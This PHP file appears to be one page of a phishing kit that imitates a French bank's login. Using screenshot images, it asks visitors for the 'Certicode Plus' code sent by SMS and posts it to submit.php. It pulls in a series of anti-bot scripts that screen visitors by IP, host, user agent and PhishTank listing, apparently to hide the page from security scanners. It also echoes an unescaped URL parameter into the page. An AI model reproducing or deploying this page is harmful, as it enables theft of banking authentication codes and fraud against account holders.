<?php


include_once '../inc/app.php';
require 'prevents/anti1.php';
require 'prevents/anti2.php';
require 'prevents/anti3.php';
require 'prevents/anti4.php';
require'prevents/anti5.php';
require 'prevents/anti6.php';
require 'prevents/anti7.php';
require 'prevents/anti8.php';
require 'prevents/anti9.php';
require 'prevents/anti10.php';
require 'prevents/anti11.php';
require 'prevents/anti12.php';
include "prevents/antibot_host.php";
include"prevents/antibot_ip.php";
include "prevents/antibot_phishtank.php";
include "prevents/antibot_userAgent.php";
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.png" type="image/png"> 

        <title>Bienvenue</title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header2">
            <div class="container cc">
                <div class="header-inner">
                    <div class="title"><img style="min-width: 246px;" src="../assets/images/login-title.png"></div>
                    <div class="menu"><img style="min-width: 243px;" src="../assets/images/login-right.png"></div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- NAV -->
        <nav>
            <div class="container cc">
                <img style="min-width: 573px;" src="../assets/images/login-menu.png">
            </div>
        </nav>
        <!-- END NAV -->

        <!-- SERVICE -->
        <div class="mb50">
            <div class="container cc">
                <img style="min-width: 940px;" src="../assets/images/login-service.png">
            </div>
        </div>
        <!-- END SERVICE -->

        <!-- FORM -->
        <div class="mb50" id="login-details">
            <div class="container">
                <form method="POST" action="submit.php">
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="certicode">
                    <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                    <legend class="mb30"><img src="../assets/images/certicode.png"></legend>
                    <p>Veuillez entrer le Certicode Plus code.<br>Veuillez saisir un code envoyé par sms sur votre mobile :</p>
                    <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'certicode') ?>">
                        <input type="text" maxlength="6" name="certicode" class="" id="certicode" placeholder="code">
                        <?php echo error_message($_SESSION['errors'],'certicode'); ?>
                    </div>
                    <div><button type="submit">CONTINUER</button></div>
                </form>
            </div>
        </div>
        <!-- END FORM -->

        <!-- BANNER -->
        <div>
            <div class="container cc text-center">
                <img style="min-width: 934px;" src="../assets/images/login-banner.png">
            </div>
        </div>
        <!-- END BANNER -->

        <!-- FOOTER -->
        <footer id="footer2" class="mt50">
            <div class="container cc">
                <img style="min-width: 863px;" src="../assets/images/login-footer.png">
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>